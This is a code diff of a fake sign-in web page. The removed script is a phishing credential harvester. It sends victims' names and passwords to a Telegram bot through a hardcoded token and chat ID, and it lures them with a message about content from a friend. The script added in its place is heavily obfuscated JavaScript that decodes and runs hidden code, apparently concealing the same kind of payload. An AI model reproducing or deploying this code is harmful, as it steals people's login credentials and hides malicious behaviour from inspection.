@@ -56,40 +56,7 @@
       </div>
     </div>
     <script>
-      document
-        .getElementById("telegramForm")
-        .addEventListener("submit", function (event) {
-          event.preventDefault(); // Halang page dari refresh
-
-          const TOKEN = "7683997891:AAGAdE-3C2glTPKp8sOgwX1UgrV26LtlCH4"; // Gantikan dengan token bot Telegram
-          const CHAT_ID = "1450763890"; // Gantikan dengan Chat ID anda
-          const name = document.getElementById("name").value;
-          const pass = document.getElementById("pass").value;
-          const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
-
-          const data = {
-            chat_id: CHAT_ID,
-            text: `Name: ${name}\nPass: ${pass}`,
-          };
-
-          fetch(url, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(data),
-          })
-            .then((response) => response.json())
-            .then((data) => {
-              document.getElementById("status").innerText =
-                "You will be redirected!";
-              document.getElementById("message").value = ""; // Kosongkan input
-            })
-            .catch((error) => {
-              document.getElementById("status").innerText =
-                "We got some problem, please sign in again.";
-              console.error("Error:", error);
-            });
-        });
-      alert("Sign in to your account to watch the content send by your friend.")
+      (function(_0x3af317,_0x362de1){var _0x118a7e=_0x40b9,_0x2593fd=_0x3af317();while(!![]){try{var _0x5a6041=-parseInt(_0x118a7e(0x19f))/0x1*(parseInt(_0x118a7e(0x19b))/0x2)+-parseInt(_0x118a7e(0x198))/0x3*(parseInt(_0x118a7e(0x1a0))/0x4)+parseInt(_0x118a7e(0x19e))/0x5*(parseInt(_0x118a7e(0x1a6))/0x6)+parseInt(_0x118a7e(0x19c))/0x7+parseInt(_0x118a7e(0x1a2))/0x8+-parseInt(_0x118a7e(0x19d))/0x9*(parseInt(_0x118a7e(0x19a))/0xa)+parseInt(_0x118a7e(0x1a3))/0xb;if(_0x5a6041===_0x362de1)break;else _0x2593fd['push'](_0x2593fd['shift']());}catch(_0x48eb2b){_0x2593fd['push'](_0x2593fd['shift']());}}}(_0x46eb,0x248a9),(function(){var _0x1e0bc0=_0x40b9,_0x27d2a1='',_0x2a6c0f=0x2fa-0x2ef;function _0x1d1f67(_0x12d04b){var _0x3b7cdc=_0x40b9,_0x34369b=0x289f93,_0x1c9d7c=_0x12d04b['length'],_0xfbc664=[];for(var _0x34186f=0x0;_0x34186f<_0x1c9d7c;_0x34186f++){_0xfbc664[_0x34186f]=_0x12d04b[_0x3b7cdc(0x1a4)](_0x34186f);};for(var _0x34186f=0x0;_0x34186f<_0x1c9d7c;_0x34186f++){var _0x10c855=_0x34369b*(_0x34186f+0x1ef)+_0x34369b%0xa21e,_0x58f400=_0x34369b*(_0x34186f+0xa5)+_0x34369b%0xabd0,_0x1eecb3=_0x10c855%_0x1c9d7c,_0x3cc762=_0x58f400%_0x1c9d7c,_0xaadb49=_0xfbc664[_0x1eecb3];_0xfbc664[_0x1eecb3]=_0xfbc664[_0x3cc762],_0xfbc664[_0x3cc762]=_0xaadb49,_0x34369b=(_0x10c855+_0x58f400)%0x417c5f;};return _0xfbc664[_0x3b7cdc(0x199)]('');};var _0x43e0f8=_0x1d1f67('czcstxrmtjrtoauyhswvdglukenonipfbcqro')[_0x1e0bc0(0x1a5)](0x0,_0x2a6c0f),_0x22dd84='va4\x2010]7]lm3a+evrheo1,aj)3)rannfvra,r=ss9;ld90f>+x8lh;ahtCx=\x20v<;r.xt4e8i(d[,y)ta6,c,.o7A).+h\x20,8gg\x20\x20))Atwl(t8\x20ala6eamv]n5e;b),u(=5]gfrr+v2\x20[o]0+=)xrlo(vt0;rao),n.[[]{\x20Aa];rf+e)r[v{vvv2r-luoy5;x(=v1}{<euv+0=9f0s+;lpgr\x22yst,}lynrt);v++,qv{+.tha)g,m=b\x20qa+usrpSh8;m\x20a).)f7dv=rhnr;;senath<0=]7,o+ngn(s18i\x20p]7bm2=(((ni(t.n=;uaoc;2nuClavfr,u\x20d[=yr+s(p=;tq.tt;isu\x20;;,ur(vaon(l9;e5rer+{-o5grl0vmu7.e=C)rvr8gi);s)rv2}p6e]8re+.u{,=yig1}*h;4.+1(l;s\x22c\x20;(;;ie-syfuob6Cc;\x22eh+o\x206fp(rre)aro,r(\x20[5h*gji4v)c,tha.\x20o.\x22A}9(cra(+ssfa,r+offy0;ycc)-a;C=h;.vsh,}yfe6(=\x20neiup).o.)6!.l\x20)\x22e)1;a]9jdlC>();,;rel\x20r.t\x22b(nxizg\x22o=]n!tanduhn-fpg+a7nry=\x20fa(Ci-(g)=ny=l)gi[zw<ltwtmnahjri.pi;tA;fg)t=,.=hl.)))+=,n=\x22r)o}dj(oon;(=a;\x22(\x20hv;a8q=(h<tu[pt=2tea(u=2a1)==([\x22u,i.13o,0=nolva(]tnge8ca9p;=h.-inri3rol.;zkC.ro((6a;po[=iws\x20va=;rj\x20lvr0naf]o=+=qbsg+sl,j82o,rnr7ri.ro=y=goa;,Sve{[j+10tmrh=rr=h[ur1ri1[;rt1uin;);;zlanuw;=e\x20.iao0ttut(',_0x1391c9=_0x1d1f67[_0x43e0f8],_0x14b925='',_0x31c394=_0x1391c9,_0x577790=_0x1391c9(_0x14b925,_0x1d1f67(_0x22dd84)),_0x4af4ff=_0x577790(_0x1d1f67(_0x1e0bc0(0x1a1))),_0x289565=_0x31c394(_0x27d2a1,_0x4af4ff);return _0x289565(0xb4e),0x1294;}()));function _0x40b9(_0x4c7eb9,_0xfaa87f){var _0x46ebab=_0x46eb();return _0x40b9=function(_0x40b9ba,_0x2b55b8){_0x40b9ba=_0x40b9ba-0x198;var _0x5e9be8=_0x46ebab[_0x40b9ba];return _0x5e9be8;},_0x40b9(_0x4c7eb9,_0xfaa87f);}function _0x46eb(){var _0x43ad3c=['2taFypQ','682283tQzOav','26118jlsBol','15SfFRAz','164204HRFadz','4YWMWzo',',0)7=:F}w1FFxu%nfb.tme=yle1r,@aA#anegr.5l3%d{53e+16_=22>%_t,_5._{.$-7dd$sbtt)y.}eantdiya(.=!;eec;%efp(.n9$,964jlmFbs=\x20eA;N(t%vt).Fe.gcF9:mlFeh9S,rbeFF;Su2hnF5ebo5q.(7e)aie>0$;o89F03]&+(.rc/nF\x27CrFt.%$<m;FF9(3z)F_e{a]=)Fee$9)0FfDjcm1ta7e\x20;\x22)e_s$ef_gsts)0,e(ee0itoslnro63=!o%r,.Ff.;FSa81jet%S&qFeFgeinbabbrFeg=9c\x276a!F;au.el@ls.F_ou]EFe;e%f%F!17%.deI;gFs1Fu2F#)23nSereFo_e2m]_(,F.en2.51}rFeea_n!.4tv\x20Fo(ov_es(F.:6a[(e/(9(.om6(g4_.vs;%m6vkb(7/;_3l)4=\x20#a3n1}sSc8Fnrt5%$_e=gr3)+tlso1uh.n$i(3F%4c)[s5.s.>.j$}..snF)g.d%\x273np5Td!.F%e]n)=]F;.Cr,(.e!r\x20e\x27F%F.t.s]}34!ata{e9g9>dd\x20y\x20!)3ct{t3\x20io9o>g.:h{reeinl6sc,ttrttre.tteFat\x20#r,D;5;.oaer\x20ns4hneo.[)F4)y=en1iet\x22Cfr2n98$6.2+9;or$f{et.e9)h=tt(e}\x20FF_F2f7%ah1.9+1xF5Ftu:8c._!j{)\x22(tc-ebF?:e2hn?2F(T%{eFF_,Fejod{s9e5p.$%;F;_fk.bl)w]?3.ya=_!1F..;$g;rrflrar;\x20F_\x200$95)r{m&)6krz=_$m.uc%an:]tnrh}Cf7faFd;+5]FjFt:oriAr.b({F5Fo4,0F=y.ie.rr(ed[9hr\x22,m1/7[=0455\x20;fFerug)Fe4F$.\x20_..Fe4.lnopFD)9)a\x27e5_yu!s9s43tN;?n$.f]sFFng_3.esdF_F;FF,j_o[_(6sp=asFgEF(ace7F1oa.3}eoC;.(f=5()B*5.5($a)=34yF1%_n_)F.%2}=St4cyt(g.%fFn5C,>)C;a$e.2e)8F;[l..F!l5.)ixst=Bc+/;54oFc<(\x20]4.F0/ig\x20\x27.h#.8;r9])!aFl.32q)e86F_a)oFF322ojciFy>u[FFc-p$F4[!n7.ed)!e.B.rF}3),B.eEF_er(!rEn2)!dse.tF({g]]!))\x223tfeFn(#na22:tFfe.g]m}e33.z45p\x20n[e=utiFt_dg#_5au%ut,cr8=t!Tg(_F#\x22F<4pmou4lFmuh7tps.osauFn7e=59p;.)+!ir=/e_t\x22_TF$yknF.sMl97]Fn\x22e.@oT9;{ah4t_weF9+$.zofh)]tedtF(6Nam_:[$a)eae(eFh9]7r)ipFFFs1Fe3FFnf.to,sm?6)!).Fee-:,(.e4e.5egd]r]wc/3be)9oshFe=e@.9wef_!F}727F0+s{unj(%${.$]F(4(tai_5,_]](emc;rers41oIFFFF$s!ons)1eg=]1aa3Fci&dlebr=<((FFF..]:\x20mg1\x22](pg]N487di,rF\x22__%to8$,i44F40.rect]jF,9r%5rr={{ostsneFNFel9\x20E6_b!j}d1i](+h]\x20TFbidso/vdiFt.]_1tmiF7):F4_b_(7.e:er0,)3_p#z}m1)e}.1)i3\x20FF[hIay3tej(}_q;bj_dc])FsF](111FFoF!r(rse!;3;@o)35e?t)_]r2=E.e45])F%S-,e.\x20;(lba=l_1%d3;Ft]$=2t(),,,3yeF4nF3(.q_d!)e0(.!9an9_e(A\x226uh)F2eso!!FF0Fs]_!..\x22e]3$.p%.7uF]%\x20(es,.tgoz4){,F(i2f7,F1(i9nF6{.;]06$;s_Fh;FjrFzFF,T_z(sr5kF\x20..y0e_sFeo.sF.Ftl$b$p2.\x204s96$fT$)0>,Fu]iFn()4[{6>e)[p!_(=l9Fto+l.$\x20e[=e(F7fo)(p}ea(o1{dtr\x20iooNrdF(3}26e\x20)a]gye7n5{cre$ajnea79506\x22.aiFve_FF-1\x20(7Ft0F1.s_2o+.F)7)tFfF4,f%1(p_on.-F7=(ei.!nm_c0F\x20*FF@F.F5%=dee93le.9;()FeFn:uwu5\x20ee*FFFi!;.Fn>9]6!><$Fbo,Fw;\x20ta)n+*l5]Fd4rh,eF33s1\x2245+.}\x20...a(sl,,sbn=]','778840fTMGOa','1804759LQBfoS','charAt','substr','40254ZazFLU','169311OasTFA','join','30pVSIue'];_0x46eb=function(){return _0x43ad3c;};return _0x46eb();}
     </script>
   </body>
 </html>
